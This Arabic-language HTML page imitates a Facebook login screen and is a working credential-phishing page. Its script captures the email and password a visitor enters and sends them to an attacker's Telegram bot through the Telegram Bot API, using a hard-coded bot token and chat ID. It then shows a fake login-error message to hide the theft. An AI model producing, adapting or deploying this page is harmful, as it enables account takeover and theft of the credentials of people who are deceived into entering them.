<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FaceBook</title>
<style>
  :root{
    --ink:#0f1115;
    --paper:#f5f6f8;
    --card:#ffffff;
    --accent:#2d5bff;
    --accent-dark:#1d3fc4;
    --line:#dfe2e8;
    --muted:#6b7280;
  }
  *{box-sizing:border-box;}
  html,body{height:100%;margin:0;}
  body{
    font-family:"Segoe UI",Tahoma,Arial,sans-serif;
    background:var(--paper);
    color:var(--ink);
    display:flex;
    flex-direction:column;
    min-height:100vh;
  }
  main{
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:32px 16px;
  }
  .wrap{
    display:flex;
    gap:64px;
    align-items:center;
    max-width:980px;
    width:100%;
    flex-wrap:wrap;
    justify-content:center;
  }
  .brand{
    max-width:420px;
    text-align:right;
  }
  .brand .logo{
    display:flex;
    align-items:center;
    gap:10px;
    justify-content:flex-end;
    margin-bottom:18px;
  }
  .brand .logo-mark{
    width:40px;height:40px;border-radius:10px;
    background:var(--accent);
    display:flex;align-items:center;justify-content:center;
    color:#fff;font-weight:700;font-size:20px;
  }
  .brand .logo-text{font-size:26px;font-weight:700;color:var(--accent);}
  .card{
    background:var(--card);
    border:1px solid var(--line);
    border-radius:12px;
    box-shadow:0 2px 10px rgba(16,20,30,.06);
    padding:28px 24px;
    width:100%;
    max-width:360px;
  }
  .field{margin-bottom:14px;}
  .field label{
    display:block;
    font-size:13px;
    color:var(--muted);
    margin-bottom:6px;
  }
  .field input{
    width:100%;
    padding:12px 14px;
    border:1px solid var(--line);
    border-radius:8px;
    font-size:15px;
    outline:none;
  }
  .field input:focus{
    border-color:var(--accent);
    box-shadow:0 0 0 3px rgba(45,91,255,.12);
  }
  .login-btn{
    width:100%;
    background:var(--accent);
    color:#fff;
    border:none;
    border-radius:8px;
    padding:13px 14px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
  }
  .login-btn:hover{background:var(--accent-dark);}
  .divider{
    display:flex;
    align-items:center;
    gap:10px;
    margin:18px 0;
    color:var(--muted);
    font-size:13px;
  }
  .divider::before,.divider::after{
    content:"";
    flex:1;
    height:1px;
    background:var(--line);
  }
  .forgot{text-align:center;}
  .forgot a{color:var(--accent);font-size:14px;text-decoration:none;}
  .signup-row{margin-top:20px;text-align:center;}
  .signup-btn{
    display:inline-block;
    background:#31a24c;
    color:#fff;
    border:none;
    border-radius:8px;
    padding:12px 22px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
  }
</style>
</head>
<body>

  <main>
    <div class="wrap">
      <div class="brand">
        <div class="logo">
          <span class="logo-text">FaceBook</span>
          <span class="logo-mark">F</span>
        </div>
      </div>

      <div class="card">
        <form id="loginForm">
          <div class="field">
            <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
            <input type="text" id="email" name="email" autocomplete="off" placeholder="example@email.com" required>
          </div>
          <div class="field">
            <label for="password">كلمة المرور</label>
            <input type="password" id="password" name="password" autocomplete="off" placeholder="••••••••" required>
          </div>

          <button type="submit" class="login-btn">دخول</button>

          <div class="forgot">
            <a href="#">نسيت كلمة المرور؟</a>
          </div>

          <div class="divider">أو</div>

          <div class="signup-row">
            <button type="button" class="signup-btn">إنشاء حساب جديد</button>
          </div>
        </form>
      </div>
    </div>
  </main>

<script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault(); // منع إعادة تحميل الصفحة

        // جلب الحقول المدخلة والتأكد من أنها ليست فارغة
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            alert('الرجاء إدخال البريد وكلمة المرور');
            return;
        }

        // بيانات البوت والمعرف (تأكد من صحتها)
        const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
        const chatId = '9072593338';

        // تجهيز نص الرسالة
        const message = `⚠️ محاولة تسجيل دخول:\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;

        // رابط الـ API الخاص بتليجرام
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            // إرسال الطلب
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            const data = await response.json();
            
            if (data.ok) {
                console.log('تم الإرسال بنجاح إلى تليجرام');
            } else {
                console.error('فشل الإرسال من تليجرام:', data.description);
            }

        } catch (error) {
            console.error('حدث خطأ في الشبكة أو الاتصال:', error);
        }

        // إعادة توجيه المستخدم بعد إتمام العملية (أو محاكاة خطأ تسجيل الدخول)
        alert('حدث خطأ في تسجيل الدخول، يرجى المحاولة لاحقاً.');
        //window.location.reload();
    });
</script>

</body>
</html>
